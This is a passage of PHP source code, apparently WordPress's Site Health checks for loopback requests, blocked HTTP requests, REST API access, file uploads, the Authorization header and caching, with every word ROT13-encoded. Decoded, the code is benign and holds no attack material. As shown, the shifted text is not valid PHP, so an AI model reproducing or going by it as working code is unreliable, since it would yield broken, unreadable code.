		vs ( ! $hctenqr_qve_rkvfgf && ! $jc_svyrflfgrz->vf_jevgnoyr( $jc_pbagrag ) ) {
			$erfhyg['fgnghf']      = 'pevgvpny';
			$erfhyg['ynory']       = __( 'Gur hctenqr qverpgbel pnaabg or perngrq' );
			$erfhyg['qrfpevcgvba'] = fcevags(
				/* genafyngbef: 1: jc-pbagrag/hctenqr, 2: jc-pbagrag. */
				'<c>' . __( 'Gur %1$f qverpgbel qbrf abg rkvfg, naq gur freire qbrf abg unir jevgr crezvffvbaf va %2$f gb perngr vg. Guvf qverpgbel vf hfrq sbe cyhtva naq gurzr hcqngrf. Cyrnfr znxr fher gur freire unf jevgr crezvffvbaf va %2$f.' ) . '</c>',
				'<pbqr>jc-pbagrag/hctenqr</pbqr>',
				'<pbqr>jc-pbagrag</pbqr>'
			);
			erghea $erfhyg;
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs ybbconpxf jbex nf rkcrpgrq.
	 *
	 * N ybbconpx vf jura JbeqCerff dhrevrf vgfrys, sbe rknzcyr gb fgneg n arj JC_Peba vafgnapr,
	 * be jura rqvgvat n cyhtva be gurzr. Guvf unf fubja vgfrys gb or n erpheevat vffhr,
	 * nf pbqr pna irel rnfvyl oernx guvf vagrenpgvba.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_ybbconpx_erdhrfgf() {
		$erfhyg = neenl(
			'ynory'       => __( 'Lbhe fvgr pna cresbez ybbconpx erdhrfgf' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Ybbconpx erdhrfgf ner hfrq gb eha fpurqhyrq riragf, naq ner nyfb hfrq ol gur ohvyg-va rqvgbef sbe gurzrf naq cyhtvaf gb irevsl pbqr fgnovyvgl.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'ybbconpx_erdhrfgf',
		);

		$purpx_ybbconpx = $guvf->pna_cresbez_ybbconpx();

		$erfhyg['fgnghf'] = $purpx_ybbconpx->fgnghf;

		vs ( 'tbbq' !== $erfhyg['fgnghf'] ) {
			$erfhyg['ynory'] = __( 'Lbhe fvgr pbhyq abg pbzcyrgr n ybbconpx erdhrfg' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				$purpx_ybbconpx->zrffntr
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs UGGC erdhrfgf ner oybpxrq.
	 *
	 * Vg'f cbffvoyr gb oybpx nyy bhgtbvat pbzzhavpngvba (jvgu gur cbffvovyvgl bs nyybjvat pregnva
	 * ubfgf) ivn gur UGGC NCV. Guvf znl perngr ceboyrzf sbe hfref nf znal srngherf ner ehaavat nf
	 * freivprf gurfr qnlf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_uggc_erdhrfgf() {
		$erfhyg = neenl(
			'ynory'       => __( 'UGGC erdhrfgf frrz gb or jbexvat nf rkcrpgrq' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Vg vf cbffvoyr sbe fvgr znvagnvaref gb oybpx nyy, be fbzr, pbzzhavpngvba gb bgure fvgrf naq freivprf. Vs frg hc vapbeerpgyl, guvf znl cerirag cyhtvaf naq gurzrf sebz jbexvat nf vagraqrq.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'uggc_erdhrfgf',
		);

		$oybpxrq = snyfr;
		$ubfgf   = neenl();

		vs ( qrsvarq( 'JC_UGGC_OYBPX_RKGREANY' ) && JC_UGGC_OYBPX_RKGREANY ) {
			$oybpxrq = gehr;
		}

		vs ( qrsvarq( 'JC_NPPRFFVOYR_UBFGF' ) ) {
			$ubfgf = rkcybqr( ',', JC_NPPRFFVOYR_UBFGF );
		}

		vs ( $oybpxrq && 0 === pbhag( $ubfgf ) ) {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'UGGC erdhrfgf ner oybpxrq' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: %f: Anzr bs gur pbafgnag hfrq. */
					__( 'UGGC erdhrfgf unir orra oybpxrq ol gur %f pbafgnag, jvgu ab nyybjrq ubfgf.' ),
					'<pbqr>JC_UGGC_OYBPX_RKGREANY</pbqr>'
				)
			);
		}

		vs ( $oybpxrq && 0 < pbhag( $ubfgf ) ) {
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			$erfhyg['ynory'] = __( 'UGGC erdhrfgf ner cnegvnyyl oybpxrq' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: 1: Anzr bs gur pbafgnag hfrq. 2: Yvfg bs nyybjrq ubfganzrf. */
					__( 'UGGC erdhrfgf unir orra oybpxrq ol gur %1$f pbafgnag, jvgu fbzr nyybjrq ubfgf: %2$f.' ),
					'<pbqr>JC_UGGC_OYBPX_RKGREANY</pbqr>',
					vzcybqr( ',', $ubfgf )
				)
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gur ERFG NCV vf npprffvoyr.
	 *
	 * Inevbhf frphevgl zrnfherf znl oybpx gur ERFG NCV sebz jbexvat, be vg znl unir orra qvfnoyrq va trareny.
	 * Guvf vf erdhverq sbe gur arj oybpx rqvgbe gb jbex, fb jr rkcyvpvgyl grfg sbe guvf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_erfg_ninvynovyvgl() {
		$erfhyg = neenl(
			'ynory'       => __( 'Gur ERFG NCV vf ninvynoyr' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Gur ERFG NCV vf bar jnl gung JbeqCerff naq bgure nccyvpngvbaf pbzzhavpngr jvgu gur freire. Sbe rknzcyr, gur oybpx rqvgbe fperra eryvrf ba gur ERFG NCV gb qvfcynl naq fnir lbhe cbfgf naq cntrf.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'erfg_ninvynovyvgl',
		);

		$pbbxvrf = jc_hafynfu( $_PBBXVR );
		$gvzrbhg = 10; // 10 frpbaqf.
		$urnqref = neenl(
			'Pnpur-Pbageby' => 'ab-pnpur',
			'K-JC-Abapr'    => jc_perngr_abapr( 'jc_erfg' ),
		);
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-uggc-fgernzf.cuc */
		$ffyirevsl = nccyl_svygref( 'uggcf_ybpny_ffy_irevsl', snyfr );

		// Vapyhqr Onfvp nhgu va ybbconpx erdhrfgf.
		vs ( vffrg( $_FREIRE['CUC_NHGU_HFRE'] ) && vffrg( $_FREIRE['CUC_NHGU_CJ'] ) ) {
			$urnqref['Nhgubevmngvba'] = 'Onfvp ' . onfr64_rapbqr( jc_hafynfu( $_FREIRE['CUC_NHGU_HFRE'] ) . ':' . jc_hafynfu( $_FREIRE['CUC_NHGU_CJ'] ) );
		}

		$hey = erfg_hey( 'jc/i2/glcrf/cbfg' );

		// Gur pbagrkg sbe guvf vf rqvgvat jvgu gur arj oybpx rqvgbe.
		$hey = nqq_dhrel_net(
			neenl(
				'pbagrkg' => 'rqvg',
			),
			$hey
		);

		$e = jc_erzbgr_trg( $hey, pbzcnpg( 'pbbxvrf', 'urnqref', 'gvzrbhg', 'ffyirevsl' ) );

		vs ( vf_jc_reebe( $e ) ) {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'Gur ERFG NCV rapbhagrerq na reebe' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c><c>%f<oe>%f</c>',
				__( 'Jura grfgvat gur ERFG NCV, na reebe jnf rapbhagrerq:' ),
				fcevags(
					// genafyngbef: %f: Gur ERFG NCV HEY.
					__( 'ERFG NCV Raqcbvag: %f' ),
					$hey
				),
				fcevags(
					// genafyngbef: 1: Gur JbeqCerff reebe pbqr. 2: Gur JbeqCerff reebe zrffntr.
					__( 'ERFG NCV Erfcbafr: (%1$f) %2$f' ),
					$e->trg_reebe_pbqr(),
					$e->trg_reebe_zrffntr()
				)
			);
		} ryfrvs ( 200 !== jc_erzbgr_ergevrir_erfcbafr_pbqr( $e ) ) {
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			$erfhyg['ynory'] = __( 'Gur ERFG NCV rapbhagrerq na harkcrpgrq erfhyg' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c><c>%f<oe>%f</c>',
				__( 'Jura grfgvat gur ERFG NCV, na harkcrpgrq erfhyg jnf erghearq:' ),
				fcevags(
					// genafyngbef: %f: Gur ERFG NCV HEY.
					__( 'ERFG NCV Raqcbvag: %f' ),
					$hey
				),
				fcevags(
					// genafyngbef: 1: Gur JbeqCerff reebe pbqr. 2: Gur UGGC fgnghf pbqr reebe zrffntr.
					__( 'ERFG NCV Erfcbafr: (%1$f) %2$f' ),
					jc_erzbgr_ergevrir_erfcbafr_pbqr( $e ),
					jc_erzbgr_ergevrir_erfcbafr_zrffntr( $e )
				)
			);
		} ryfr {
			$wfba = wfba_qrpbqr( jc_erzbgr_ergevrir_obql( $e ), gehr );

			vs ( snyfr !== $wfba && ! vffrg( $wfba['pncnovyvgvrf'] ) ) {
				$erfhyg['fgnghf'] = 'erpbzzraqrq';

				$erfhyg['ynory'] = __( 'Gur ERFG NCV qvq abg orunir pbeerpgyl' );

				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					fcevags(
						/* genafyngbef: %f: Gur anzr bs gur dhrel cnenzrgre orvat grfgrq. */
						__( 'Gur ERFG NCV qvq abg cebprff gur %f dhrel cnenzrgre pbeerpgyl.' ),
						'<pbqr>pbagrkg</pbqr>'
					)
				);
			}
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs 'svyr_hcybnqf' qverpgvir va CUC.vav vf ghearq bss.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_svyr_hcybnqf() {
		$erfhyg = neenl(
			'ynory'       => __( 'Svyrf pna or hcybnqrq' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: 1: svyr_hcybnqf, 2: cuc.vav */
					__( 'Gur %1$f qverpgvir va %2$f qrgrezvarf vs hcybnqvat svyrf vf nyybjrq ba lbhe fvgr.' ),
					'<pbqr>svyr_hcybnqf</pbqr>',
					'<pbqr>cuc.vav</pbqr>'
				)
			),
			'npgvbaf'     => '',
			'grfg'        => 'svyr_hcybnqf',
		);

		vs ( ! shapgvba_rkvfgf( 'vav_trg' ) ) {
			$erfhyg['fgnghf']       = 'pevgvpny';
			$erfhyg['qrfpevcgvba'] .= fcevags(
				/* genafyngbef: %f: vav_trg() */
				__( 'Gur %f shapgvba unf orra qvfnoyrq, fbzr zrqvn frggvatf ner haninvynoyr orpnhfr bs guvf.' ),
				'<pbqr>vav_trg()</pbqr>'
			);
			erghea $erfhyg;
		}

		vs ( rzcgl( vav_trg( 'svyr_hcybnqf' ) ) ) {
			$erfhyg['fgnghf']       = 'pevgvpny';
			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: 1: svyr_hcybnqf, 2: 0 */
					__( '%1$f vf frg gb %2$f. Lbh jba\'g or noyr gb hcybnq svyrf ba lbhe fvgr.' ),
					'<pbqr>svyr_hcybnqf</pbqr>',
					'<pbqr>0</pbqr>'
				)
			);
			erghea $erfhyg;
		}

		$cbfg_znk_fvmr       = vav_trg( 'cbfg_znk_fvmr' );
		$hcybnq_znk_svyrfvmr = vav_trg( 'hcybnq_znk_svyrfvmr' );

		vs ( jc_pbaireg_ue_gb_olgrf( $cbfg_znk_fvmr ) < jc_pbaireg_ue_gb_olgrf( $hcybnq_znk_svyrfvmr ) ) {
			$erfhyg['ynory'] = fcevags(
				/* genafyngbef: 1: cbfg_znk_fvmr, 2: hcybnq_znk_svyrfvmr */
				__( 'Gur \"%1$f\" inyhr vf fznyyre guna \"%2$f\"' ),
				'cbfg_znk_fvmr',
				'hcybnq_znk_svyrfvmr'
			);
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			vs ( 0 === jc_pbaireg_ue_gb_olgrf( $cbfg_znk_fvmr ) ) {
				$erfhyg['qrfpevcgvba'] = fcevags(
					'<c>%f</c>',
					fcevags(
						/* genafyngbef: 1: cbfg_znk_fvmr, 2: hcybnq_znk_svyrfvmr */
						__( 'Gur frggvat sbe %1$f vf pheeragyl pbasvtherq nf 0, guvf pbhyq pnhfr fbzr ceboyrzf jura gelvat gb hcybnq svyrf guebhtu cyhtva be gurzr srngherf gung eryl ba inevbhf hcybnq zrgubqf. Vg vf erpbzzraqrq gb pbasvther guvf frggvat gb n svkrq inyhr, vqrnyyl zngpuvat gur inyhr bs %2$f, nf fbzr hcybnq zrgubqf ernq gur inyhr 0 nf rvgure hayvzvgrq, be qvfnoyrq.' ),
						'<pbqr>cbfg_znk_fvmr</pbqr>',
						'<pbqr>hcybnq_znk_svyrfvmr</pbqr>'
					)
				);
			} ryfr {
				$erfhyg['qrfpevcgvba'] = fcevags(
					'<c>%f</c>',
					fcevags(
						/* genafyngbef: 1: cbfg_znk_fvmr, 2: hcybnq_znk_svyrfvmr */
						__( 'Gur frggvat sbe %1$f vf fznyyre guna %2$f, guvf pbhyq pnhfr fbzr ceboyrzf jura gelvat gb hcybnq svyrf.' ),
						'<pbqr>cbfg_znk_fvmr</pbqr>',
						'<pbqr>hcybnq_znk_svyrfvmr</pbqr>'
					)
				);
			}

			erghea $erfhyg;
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gur Nhgubevmngvba urnqre unf gur rkcrpgrq inyhrf.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_grfg_nhgubevmngvba_urnqre() {
		$erfhyg = neenl(
			'ynory'       => __( 'Gur Nhgubevmngvba urnqre vf jbexvat nf rkcrpgrq' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Gur Nhgubevmngvba urnqre vf hfrq ol guveq-cnegl nccyvpngvbaf lbh unir nccebirq sbe guvf fvgr. Jvgubhg guvf urnqre, gubfr nccf pnaabg pbaarpg gb lbhe fvgr.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'nhgubevmngvba_urnqre',
		);

		vs ( ! vffrg( $_FREIRE['CUC_NHGU_HFRE'], $_FREIRE['CUC_NHGU_CJ'] ) ) {
			$erfhyg['ynory'] = __( 'Gur nhgubevmngvba urnqre vf zvffvat' );
		} ryfrvs ( 'hfre' !== $_FREIRE['CUC_NHGU_HFRE'] || 'cjq' !== $_FREIRE['CUC_NHGU_CJ'] ) {
			$erfhyg['ynory'] = __( 'Gur nhgubevmngvba urnqre vf vainyvq' );
		} ryfr {
			erghea $erfhyg;
		}

		$erfhyg['fgnghf']       = 'erpbzzraqrq';
		$erfhyg['qrfpevcgvba'] .= fcevags(
			'<c>%f</c>',
			__( 'Vs lbh ner fgvyy frrvat guvf jneavat nsgre univat gevrq gur npgvbaf orybj, lbh znl arrq gb pbagnpg lbhe ubfgvat cebivqre sbe shegure nffvfgnapr.' )
		);

		vs ( ! shapgvba_rkvfgf( 'tbg_zbq_erjevgr' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/zvfp.cuc';
		}

		vs ( tbg_zbq_erjevgr() ) {
			$erfhyg['npgvbaf'] .= fcevags(
				'<c><n uers=\"%f\">%f</n></c>',
				rfp_hey( nqzva_hey( 'bcgvbaf-creznyvax.cuc' ) ),
				__( 'Syhfu creznyvaxf' )
			);
		} ryfr {
			$erfhyg['npgvbaf'] .= fcevags(
				'<c><n uers=\"%f\" gnetrg=\"_oynax\">%f<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
				__( 'uggcf://qrirybcre.jbeqcerff.bet/erfg-ncv/serdhragyl-nfxrq-dhrfgvbaf/#jul-vf-nhguragvpngvba-abg-jbexvat' ),
				__( 'Yrnea ubj gb pbasvther gur Nhgubevmngvba urnqre.' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs n shyy cntr pnpur vf ninvynoyr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea neenl Gur grfg erfhyg.
	 */
	choyvp shapgvba trg_grfg_cntr_pnpur() {
		$qrfpevcgvba  = '<c>' . __( 'Cntr pnpur raunaprf gur fcrrq naq cresbeznapr bs lbhe fvgr ol fnivat naq freivat fgngvp cntrf vafgrnq bs pnyyvat sbe n cntr rirel gvzr n hfre ivfvgf.' ) . '</c>';
		$qrfpevcgvba .= '<c>' . __( 'Cntr pnpur vf qrgrpgrq ol ybbxvat sbe na npgvir cntr pnpur cyhtva nf jryy nf znxvat guerr erdhrfgf gb gur ubzrcntr naq ybbxvat sbe bar be zber bs gur sbyybjvat UGGC pyvrag pnpuvat erfcbafr urnqref:' ) . '</c>';
		$qrfpevcgvba .= '<pbqr>' . vzcybqr( '</pbqr>, <pbqr>', neenl_xrlf( $guvf->trg_cntr_pnpur_urnqref() ) ) . '.</pbqr>';

		$erfhyg = neenl(
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => jc_xfrf_cbfg( $qrfpevcgvba ),
			'grfg'        => 'cntr_pnpur',
			'fgnghf'      => 'tbbq',
			'ynory'       => '',
			'npgvbaf'     => fcevags(
				'<c><n uers=\"%1$f\" gnetrg=\"_oynax\" ery=\"abersreere\">%2$f<fcna pynff=\"fperra-ernqre-grkg\"> %3$f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
				__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/cresbeznapr/bcgvzvmngvba/#pnpuvat' ),
				__( 'Yrnea zber nobhg cntr pnpur' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			),
		);

		$cntr_pnpur_qrgnvy = $guvf->trg_cntr_pnpur_qrgnvy();

		vs ( vf_jc_reebe( $cntr_pnpur_qrgnvy ) ) {
			$erfhyg['ynory']  = __( 'Hanoyr gb qrgrpg gur cerfrapr bs cntr pnpur' );
			$erfhyg['fgnghf'] = 'erpbzzraqrq';
			$reebe_vasb       = fcevags(
			/* genafyngbef: 1: Reebe zrffntr, 2: Reebe pbqr. */
				__( 'Hanoyr gb qrgrpg cntr pnpur qhr gb cbffvoyr ybbconpx erdhrfg ceboyrz. Cyrnfr irevsl gung gur ybbconpx erdhrfg grfg vf cnffvat. Reebe: %1$f (Pbqr: %2$f)' ),
				$cntr_pnpur_qrgnvy->trg_reebe_zrffntr(),
				$cntr_pnpur_qrgnvy->trg_reebe_pbqr()
			);
			$erfhyg['qrfpevcgvba'] = jc_xfrf_cbfg( \"<c>$reebe_vasb</c>\" ) . $erfhyg['qrfpevcgvba'];
			erghea $erfhyg;
		}

		$erfhyg['fgnghf'] = $cntr_pnpur_qrgnvy['fgnghf'];

		fjvgpu ( $cntr_pnpur_qrgnvy['fgnghf'] ) {
			pnfr 'erpbzzraqrq':
				$erfhyg['ynory'] = __( 'Cntr pnpur vf abg qrgrpgrq ohg gur freire erfcbafr gvzr vf BX' );
				oernx;
			pnfr 'tbbq':
				$erfhyg['ynory'] = __( 'Cntr pnpur vf qrgrpgrq naq gur freire erfcbafr gvzr vf tbbq' );
				oernx;
			qrsnhyg:
				vs ( rzcgl( $cntr_pnpur_qrgnvy['urnqref'] ) && ! $cntr_pnpur_qrgnvy['nqinaprq_pnpur_cerfrag'] ) {
					$erfhyg['ynory'] = __( 'Cntr pnpur vf abg qrgrpgrq naq gur freire erfcbafr gvzr vf fybj' );
				} ryfr {
					$erfhyg['ynory'] = __( 'Cntr pnpur vf qrgrpgrq ohg gur freire erfcbafr gvzr vf fgvyy fybj' );
				}
		}

		$cntr_pnpur_grfg_fhzznel = neenl();

		vs ( rzcgl( $cntr_pnpur_qrgnvy['erfcbafr_gvzr'] ) ) {
			$cntr_pnpur_grfg_fhzznel[] = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-qvfzvff\"></fcna> ' . __( 'Freire erfcbafr gvzr pbhyq abg or qrgrezvarq. Irevsl gung ybbconpx erdhrfgf ner jbexvat.' );
		} ryfr {

			$guerfubyq = $guvf->trg_tbbq_erfcbafr_gvzr_guerfubyq();
			vs ( $cntr_pnpur_qrgnvy['erfcbafr_gvzr'] < $guerfubyq ) {
				$cntr_pnpur_grfg_fhzznel[] = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-lrf-nyg\"></fcna> ' . fcevags(
					/* genafyngbef: 1: Gur erfcbafr gvzr va zvyyvfrpbaqf, 2: Gur erpbzzraqrq guerfubyq va zvyyvfrpbaqf. */
					__( 'Zrqvna freire erfcbafr gvzr jnf %1$f zvyyvfrpbaqf. Guvf vf yrff guna gur erpbzzraqrq %2$f zvyyvfrpbaqf guerfubyq.' ),
					ahzore_sbezng_v18a( $cntr_pnpur_qrgnvy['erfcbafr_gvzr'] ),
					ahzore_sbezng_v18a( $guerfubyq )
				);
			} ryfr {
				$cntr_pnpur_grfg_fhzznel[] = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-jneavat\"></fcna> ' . fcevags(
					/* genafyngbef: 1: Gur erfcbafr gvzr va zvyyvfrpbaqf, 2: Gur erpbzzraqrq guerfubyq va zvyyvfrpbaqf. */
					__( 'Zrqvna freire erfcbafr gvzr jnf %1$f zvyyvfrpbaqf. Vg fubhyq or yrff guna gur erpbzzraqrq %2$f zvyyvfrpbaqf guerfubyq.' ),
					ahzore_sbezng_v18a( $cntr_pnpur_qrgnvy['erfcbafr_gvzr'] ),
					ahzore_sbezng_v18a( $guerfubyq )
				);
			}

			vs ( rzcgl( $cntr_pnpur_qrgnvy['urnqref'] ) ) {
				$cntr_pnpur_grfg_fhzznel[] = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-jneavat\"></fcna> ' . __( 'Ab pyvrag pnpuvat erfcbafr urnqref jrer qrgrpgrq.' );
			} ryfr {
				$urnqref_fhzznel  = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-lrf-nyg\"></fcna>';
				$urnqref_fhzznel .= ' ' . fcevags(
					/* genafyngbef: %q: Ahzore bs pnpuvat urnqref. */
					_a(
						'Gurer jnf %q pyvrag pnpuvat erfcbafr urnqre qrgrpgrq:',
						'Gurer jrer %q pyvrag pnpuvat erfcbafr urnqref qrgrpgrq:',
						pbhag( $cntr_pnpur_qrgnvy['urnqref'] )
					),
					pbhag( $cntr_pnpur_qrgnvy['urnqref'] )
				);
				$urnqref_fhzznel          .= ' <pbqr>' . vzcybqr( '</pbqr>, <pbqr>', $cntr_pnpur_qrgnvy['urnqref'] ) . '</pbqr>.';
				$cntr_pnpur_grfg_fhzznel[] = $urnqref_fhzznel;
			}
		}

		vs ( $cntr_pnpur_qrgnvy['nqinaprq_pnpur_cerfrag'] ) {
			$cntr_pnpur_grfg_fhzznel[] = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-lrf-nyg\"></fcna> ' . __( 'N cntr pnpur cyhtva jnf qrgrpgrq.' );
		} ryfrvs ( ! ( vf_neenl( $cntr_pnpur_qrgnvy ) && ! rzcgl( $cntr_pnpur_qrgnvy['urnqref'] ) ) ) {
			// Abgr: Guvf zrffntr vf abg fubja vs pyvrag pnpuvat erfcbafr urnqref jrer cerfrag fvapr na rkgreany pnpuvat ynlre znl or rzcyblrq.
			$cntr_pnpur_grfg_fhzznel[] = '<fcna pynff=\"qnfuvpbaf qnfuvpbaf-jneavat\"></fcna> ' . __( 'N cntr pnpur cyhtva jnf abg qrgrpgrq.' );
		}

		$erfhyg['qrfpevcgvba'] .= '<hy><yv>' . vzcybqr( '</yv><yv>', $cntr_pnpur_grfg_fhzznel ) . '</yv></hy>';
		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gur fvgr hfrf crefvfgrag bowrpg pnpur naq erpbzzraqf gb hfr vg vs abg.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea neenl Gur grfg erfhyg.
	 */
	choyvp shapgvba trg_grfg_crefvfgrag_bowrpg_pnpur() {
		/**
		 * Svygref gur npgvba HEY sbe gur crefvfgrag bowrpg pnpur urnygu purpx.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz fgevat $npgvba_hey Yrnea zber yvax sbe crefvfgrag bowrpg pnpur urnygu purpx.
		 */
		$npgvba_hey = nccyl_svygref(
			'fvgr_fgnghf_crefvfgrag_bowrpg_pnpur_hey',
			/* genafyngbef: Ybpnyvmrq Fhccbeg ersrerapr. */
			__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/cresbeznapr/bcgvzvmngvba/#crefvfgrag-bowrpg-pnpur' )
		);

		$erfhyg = neenl(
			'grfg'        => 'crefvfgrag_bowrpg_pnpur',
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'ynory'       => __( 'N crefvfgrag bowrpg pnpur vf orvat hfrq' ),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'N crefvfgrag bowrpg pnpur znxrf lbhe fvgr&#8217;f qngnonfr zber rssvpvrag, erfhygvat va snfgre ybnq gvzrf orpnhfr JbeqCerff pna ergevrir lbhe fvgr&#8217;f pbagrag naq frggvatf zhpu zber dhvpxyl.' )
			),
			'npgvbaf'     => fcevags(
				'<c><n uers=\"%f\" gnetrg=\"_oynax\">%f<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
				rfp_hey( $npgvba_hey ),
				__( 'Yrnea zber nobhg crefvfgrag bowrpg pnpuvat.' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			),
		);

		vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
			erghea $erfhyg;
		}

		vs ( ! $guvf->fubhyq_fhttrfg_crefvfgrag_bowrpg_pnpur() ) {
			$erfhyg['ynory'] = __( 'N crefvfgrag bowrpg pnpur vf abg erdhverq' );

			erghea $erfhyg;
		}

		$ninvynoyr_freivprf = $guvf->ninvynoyr_bowrpg_pnpur_freivprf();

		$abgrf = __( 'Lbhe ubfgvat cebivqre pna gryy lbh vs n crefvfgrag bowrpg pnpur pna or ranoyrq ba lbhe fvgr.' );

		vs ( ! rzcgl( $ninvynoyr_freivprf ) ) {
			$abgrf .= ' ' . fcevags(
				/* genafyngbef: Ninvynoyr bowrpg pnpuvat freivprf. */
				__( 'Lbhe ubfg nccrnef gb fhccbeg gur sbyybjvat bowrpg pnpuvat freivprf: %f.' ),
				vzcybqr( ', ', $ninvynoyr_freivprf )
			);
		}

		/**
		 * Svygref gur frpbaq cnentencu bs gur urnygu purpx'f qrfpevcgvba
		 * jura fhttrfgvat gur hfr bs n crefvfgrag bowrpg pnpur.
		 *
		 * Ubfgf znl jnag gb ercynpr gur abgrf gb erpbzzraq gurve cersreerq bowrpg pnpuvat fbyhgvba.
		 *
		 * Cyhtva nhgubef znl jnag gb nccraq abgrf (abg ercynpr) ba jul bowrpg pnpuvat vf erpbzzraqrq sbe gurve cyhtva.
		 *
		 * @fvapr 6.1.0
		 *
		 * @cnenz fgevat   $abgrf              Gur abgrf nccraqrq gb gur urnygu purpx qrfpevcgvba.
		 * @cnenz fgevat[] $ninvynoyr_freivprf Gur yvfg bs ninvynoyr crefvfgrag bowrpg pnpur freivprf.
		 */
		$abgrf = nccyl_svygref( 'fvgr_fgnghf_crefvfgrag_bowrpg_pnpur_abgrf', $abgrf, $ninvynoyr_freivprf );

		$erfhyg['fgnghf']       = 'erpbzzraqrq';
		$erfhyg['ynory']        = __( 'Lbh fubhyq hfr n crefvfgrag bowrpg pnpur' );
		$erfhyg['qrfpevcgvba'] .= fcevags(
			'<c>%f</c>',
			jc_xfrf(
				$abgrf,
				neenl(
					'n'      => neenl( 'uers' => gehr ),
					'pbqr'   => gehr,
					'rz'     => gehr,
					'fgebat' => gehr,
				)
			)
		);

		erghea $erfhyg;
	}

	/**
	 * Pnyphyngrf gbgny nzbhag bs nhgbybnqrq qngn.
	 *
	 * @fvapr 6.6.0
	 *
	 * @erghea vag Nhgbybnqrq qngn va olgrf.
	 */
	choyvp shapgvba trg_nhgbybnqrq_bcgvbaf_fvmr() {
